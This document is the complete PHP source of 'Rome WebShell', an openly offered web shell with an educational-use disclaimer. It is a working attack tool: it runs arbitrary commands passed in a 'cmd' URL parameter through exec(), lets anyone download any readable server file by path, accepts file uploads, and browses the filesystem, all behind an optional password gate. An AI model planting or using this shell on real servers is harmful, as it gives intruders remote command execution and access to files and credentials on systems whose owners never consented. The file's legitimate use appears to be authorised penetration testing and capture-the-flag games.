<!-- 
    @author Caesarovich
    @repository https://github.com/Caesarovich/rome-webshell

    This code is for educationnal purposes only.
    Malicious usage of this code will not hold the author responsible.
    Do not pentest without explicit permissions.

-->



<?php
    // Password protection, useful for King of The Hill games
    $pass=''; // Set to null to disable; Set to string to enable, must be the sha512 hash of the password.


    if($pass != null) {
        if (isset($_COOKIE['pass'])) { // We use cookies and not url parameter for security reasons
            // As it is likely that URL parameters are logged by the webserver, thus revealing the password
            if (hash('sha512', $_COOKIE['pass']) !== $pass) {
                echo "Wrong password !";
                exit;
            }
        } else {
            echo "Wrong password !";
            exit;
        }
    }
?>

<?php
    // Upload file to the server
    if (isset($_POST['upload'])) {
        $desinationDir = getDir();
        $destinationFile = $desinationDir.'/'.basename($_FILES['file']['name']);

        if (file_exists($destinationFile)) {
            echo "<script>alert('Error: File already exists !')</script>";
        }
        else if (move_uploaded_file($_FILES['file']['tmp_name'], $destinationFile)) {
            echo "<script>alert('File uploaded successfuly !')</script>";
        } else {
            echo "<script>alert('Error: Could not upload file !')</script>";
        }
    
    }
?>

<?php
    // Download a file from the server
    if (isset($_GET['download'])) {
        $file = $_GET['download'];
        if (file_exists($file)) {
            if (is_readable($file)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="'.basename($file).'"');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: '.filesize($file));
                readfile($file);
                exit;
            } else {
                echo "<script>alert('Error: Could not read the file !')</script>";
                exit;
            }
        }
    }
?>

<?php
    function printPerms($file) {
        $mode = fileperms($file);
        if( $mode & 0x1000 ) { $type='p'; }
        else if( $mode & 0x2000 ) { $type='c'; }
        else if( $mode & 0x4000 ) { $type='d'; }
        else if( $mode & 0x6000 ) { $type='b'; }
        else if( $mode & 0x8000 ) { $type='-'; }
        else if( $mode & 0xA000 ) { $type='l'; }
        else if( $mode & 0xC000 ) { $type='s'; }
        else $type='u';
        $owner["read"] = ($mode & 00400) ? 'r' : '-';
        $owner["write"] = ($mode & 00200) ? 'w' : '-';
        $owner["execute"] = ($mode & 00100) ? 'x' : '-';
        $group["read"] = ($mode & 00040) ? 'r' : '-';
        $group["write"] = ($mode & 00020) ? 'w' : '-';
        $group["execute"] = ($mode & 00010) ? 'x' : '-';
        $world["read"] = ($mode & 00004) ? 'r' : '-';
        $world["write"] = ($mode & 00002) ? 'w' : '-';
        $world["execute"] = ($mode & 00001) ? 'x' : '-';
        if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
        if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
        if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
        $s=sprintf("%1s", $type);
        $s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
        $s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
        $s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
        return $s;
    }

    function formatSizeUnits($bytes) {
        if ($bytes >= 1073741824)
        {
            $bytes = number_format($bytes / 1073741824, 2) . ' GB';
        }
        elseif ($bytes >= 1048576)
        {
            $bytes = number_format($bytes / 1048576, 2) . ' MB';
        }
        elseif ($bytes >= 1024)
        {
            $bytes = number_format($bytes / 1024, 2) . ' KB';
        }
        elseif ($bytes > 1)
        {
            $bytes = $bytes . ' bytes';
        }
        elseif ($bytes == 1)
        {
            $bytes = $bytes . ' byte';
        }
        else
        {
            $bytes = '0 bytes';
        }

        return $bytes;
    }


    function getDir() {
        return isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
    }


    function makeFileName($file) {
        if (is_dir(getDir().'/'.$file)) {
            return '<a href="'.$_SERVER['PHP_SELF'].'?dir='.realpath(getDir().'/'.$file).'">'.$file.'</a>';
        } else {
            return '<a href="'.$_SERVER['PHP_SELF'].'?download='.realpath(getDir().'/'.$file).'">'.$file.'</a>';
        }
    }

    function getFiles() {
        $files = scandir(getDir());

        $even = true;
        if ($files != null) {
            foreach($files as $filename){
                //Simply print them out onto the screen.
                echo '<tr style="background-color:'.($even  ? '#515151' : '#414141').';">';
                echo '<td style="font-weight:'.(is_dir(getDir().'/'.$filename) ? 'bold' : 'thin').';">'.makeFileName($filename).'</td>'; 
                echo '<td>'.posix_getpwuid(fileowner(getDir().'/'.$filename))['name'].'</td>';
                echo '<td>'.printPerms(getDir().'/'.$filename).'</td>';
                echo '<td>'.formatSizeUnits(filesize(getDir().'/'.$filename)).'</td>';
                echo '</tr>';
                $even = !$even;
            }
        } else {
            echo "<p>Couldn't open that directory !";
        }
    }

    function getCmdResults() {
        global $cmdresults;
        global $retval;
        
        if ($retval == 0 ) {
            foreach ($cmdresults as $line) {
                echo "$line \n<br>";
            }
        } else {
            echo "Execution failed with error code: ".$retval;
        }    
    }

    function getCommandLine() {
        $hostname = gethostname() ?? 'none';
        $username = posix_getpwuid(posix_geteuid())['name'];
        $dir = getDir();
        $cmd = isset($_GET['cmd']) ? $_GET['cmd'] : 'No command';

        return '<span style="color: #19c42a">'.$username.'@'.$hostname.'</span>: <span style="color: #0f7521">'.$dir.'</span>$ '.$cmd;
    }
?>


<?php 
    // Execute a command on the server
    $cmdresults;
    $retval=null;

    if (isset($_GET['cmd'])) {
        exec('cd '.realpath(getDir()).' && '.$_GET['cmd'], $cmdresults, $retval);
    }
?>

<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>Rome WebShell</title>
        
        <script>
            function changeDir() {
                const url = '<?php echo $_SERVER['PHP_SELF'].'?dir='?>';
                const path = window.prompt("Enter the path you want to naviguate to (Eg: '/home/user'): ");

                if (path) window.location = (url + path);
            }
        </script>

        <script>
            const popupHTML = `
                <div class="popup-container" id="upload-popup">
                    <div class="popup">
                        <h4>Choose a file to upload</h4>
                        <form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.getDir()?>" method="POST" enctype="multipart/form-data">
                            <input type="file" name='file' id='file' required>
                            <div class="popup-buttons">
                                <button type="button" onclick="hidePopup()">Cancel</button>
                                <input type="submit" value="Upload" name="upload">
                            </div>
                        </form>
                    </div>
                </div>
            `;
            function showPopup() {
                const body = document.getElementsByTagName('body')[0];
                const bodyHTML = body.innerHTML;

                body.innerHTML = popupHTML + bodyHTML;
            }

            function hidePopup() {
                const body = document.getElementsByTagName('body')[0];
                body.removeChild(body.getElementsByClassName('popup-container')[0]); 
            }
        </script>
    </head>
    <body class="body-container">   
        <header>
            <nav>
                <h1>> Rome Shell</h1>
                <div class="nav-items">
                    <a onclick="showPopup()">Upload file</a>
                    <a onclick="changeDir()">Change Directory</a>
                </div>
            </nav>
        </header>
        <div class="content-container">
            <div class="explorer-panel">
                <h4>Exploring: <?php echo getDir()?></h4>
                <table>
                    <tr style="background-color:#292929;">
                        <th>Folder / <span style="font-weight: lighter;">File</span></th>
                        <th>Owner</th>
                        <th>Permissions</th>
                        <th>Size</th>
                    </tr>
                    <?php getFiles()?>
                </table>
            </div>
            <div class="command-panel">
                <div class="command-output">
                    <p><?php echo getCommandLine()?></p>
                    <p><?php getCmdResults()?></p>
                </div>
                <form id="command-input" action="<?php echo $_SERVER['PHP_SELF']?>" method="get">
                    <input type="text" name="cmd">
                    <input type="hidden" name="dir" value="<?php echo getDir()?>"/>
                    <button action="submit">
                        <p>Send</p>
                    </button>
                </form>
            </div>
        </div>
        <style>

            :root {
                --background-color-1: #101010;
                --background-color-2: #202020;
                --background-color-3: #303030;
                --background-color-4: #404040;
                --primary-color: #0e9c15;
                --secondary-color: #0f7521;
            }

            html, body {
                width: 100%;
                height: 100%;
                margin: 0;
                padding: 0;
                background-color: var(--background-color-2);
                
            }

            .body-container {
                display: grid;
                grid-template-rows: 50px calc(100% - 50px);
            }

            header {
                z-index:1;
                background-color: var(--primary-color);
                box-shadow: 0px 2px 6px black;
            }

            header nav {
                height: 100%;
                display: flex;
                justify-content: flex-start;     
                color: white;
                font-family: Arial, Helvetica, sans-serif;  
            }

            header h1 {
                height: 100%;
                margin: 0;
                margin-left: 20px;
                text-align: center;
                line-height: 50px;
                font-size: 40px;
            }

            header .nav-items {
                height: 100%;
                width: auto;
                margin: 0;
                display: flex;
                flex-grow: 1;
                justify-content: flex-end;
            }

            header .nav-items a {
                height: 100%;
                margin-right: 30px;
                color: white;
                font-size: 25px;
                text-decoration: none;
                line-height: 50px;
                text-align:center;
                transition: ease-in 0.2s;     
            }

            header .nav-items a:hover {
                color: #d0d0d0;
                cursor: pointer;
            }

            .content-container {
                height: 100%;
                position: relative;
                display: grid;
                grid-template-columns: 30% 70%;       
            }

            .explorer-panel {
                background-color: var(--background-color-3);
                font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
                overflow-y: scroll;
                scrollbar-color: var(--background-color-4) var(--background-color-3);
                scrollbar-width: thin;
                box-shadow: 0px 0px 4px black;
                padding: 3px;
            }

            .explorer-panel h4 {
                margin: 10px;
                font-size: 20px;
            }

            .explorer-panel table {
                width: 100%;
                word-wrap: break-word;
                border-spacing: 2px;
                table-layout: fixed;
                background-color: var(--background-color-2);
            }

            .explorer-panel table td {
                padding: 1px 2px;
            }

            .explorer-panel table a {
                color: var(--primary-color);
                text-decoration: none;         
            }

            .explorer-panel table a:hover {
                color: var(--secondary-color);
                transition: ease 0.2s;
            }

            .command-panel {    
                margin: 20px;
                padding: 15px;
                border-radius: 5px;
                background-color: var(--background-color-3);
                display: grid;
                grid-template-rows: 93% calc(7% - 15px);
                row-gap: 15px;
                box-shadow: 0px 0px 6px black;
            }

            .command-output {
                padding: 5px;
                border-radius: 5px;
                background-color: var(--background-color-1);              
                overflow-y: scroll;
                scrollbar-color: var(--background-color-4) var(--background-color-3);
                scrollbar-width: thin;
            }

            .command-output p {
                margin: 0px;
                font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
            }

            #command-input {
                display: grid;
                grid-template-columns: 89% 10%;
                grid-template-rows: 100%;
                column-gap: 1%;
            }

            #command-input input{
                height: 100%;
                width: 100%;
                border-radius: 5px;
                border: none;
                background-color: var(--background-color-2);        
                color: white;
                font-size: 200%;          
            }

            #command-input button{
                height: 100%;
                width: 100%;
                border: none;
                border-radius: 5px;
                background-color: var(--background-color-4);  
                cursor: pointer;
            }

            #command-input button:hover{
                background-color: var(--primary-color);
                transition: ease-in-out 0.3s;
            }

            #command-input button p{
                margin:0;
                color: white;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                font-size: 150%;
                font-weight: bolder;
                line-height: 100%;
            }


            .popup-container {
                z-index: 5;
                position: fixed;
                background-color: rgba(10,10,10, 0.6);
                width: 100%;
                height: 100%;
                display: grid;
                justify-content: center;
                align-content: center;
                grid-template-columns: 30%;
                grid-template-rows: 35%;
            }

            .popup {
                background-color: var(--background-color-3);
                border-radius: 5px;
                box-shadow: 0px 2px 6px black;
                display: grid;
                grid-template-rows: 20% 70%;
                row-gap: 10%;
                padding: 2.5%;
            }

            .popup h4{
                text-align: center;
                font-family: 'Courier New', Courier, monospace;
                font-size: 23px;
            }

            .popup form {
                display: grid;
                grid-template-rows: 80% 20%;
                grid-template-columns: 95%;
                justify-content: center;
                align-content: center;
            }

            .popup-buttons {
                height: 100%;
                display: inline-flex;
                flex-wrap: wrap;
                gap: 10%;
            }

            .popup-buttons button {
                width: 45%;
                background-color: var(--background-color-4);
                border-radius: 4px;;
                border: none;
                font-size: 22px;
                color: white;
                transition: ease-in 0.2s;
            }

            .popup-buttons button:hover {
                background-color: var(--background-color-2);
                cursor: pointer;            
            }

            .popup-buttons input {
                width: 45%;
                background-color: var(--primary-color);
                border-radius: 4px;;
                border: none;
                font-size: 22px;
                color: white;
                transition: ease-in 0.2s;
            }

            .popup-buttons input:hover {
                background-color: var(--secondary-color);
                cursor: pointer; 
            }
        </style>
    </body>
</html>



